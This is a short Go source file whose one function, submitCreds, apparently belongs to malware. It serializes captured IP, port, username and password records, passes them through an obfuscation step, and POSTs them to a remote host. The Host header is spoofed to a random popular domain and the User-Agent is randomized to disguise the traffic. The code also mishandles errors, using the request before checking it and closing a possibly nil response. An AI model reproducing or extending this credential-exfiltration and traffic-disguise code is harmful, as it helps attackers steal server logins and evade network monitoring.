package main

import (
	"bytes"
	"encoding/json"
	"fmt"
	"net/http"
)

type Creds struct {
	Ip   string `json:"ip"`
	Port int    `json:"port"`
	User string `json:"user"`
	Pass string `json:"pass"`
}

// submitCreds sends credentials to the Domena service.
func submitCreds(host string, creds Creds) error {
	credsJson, err := json.Marshal(creds)
	if err != nil {
		return err
	}

	payloadJson, err := serializedTraffic(string(credsJson))
	if err != nil {
		return err
	}

	request, err := http.NewRequest("POST", host+"/v1/services", bytes.NewBuffer([]byte(payloadJson)))
	request.Host = randomPopularDomain()
	request.Header.Set("Content-Type", "application/json")
	request.Header.Set("User-Agent", randomUserAgent())
	if err != nil {
		return err
	}

	client := &http.Client{}

	response, err := client.Do(request)
	if err != nil {
		fmt.Println(err)
	}

	defer response.Body.Close()

	return nil
}
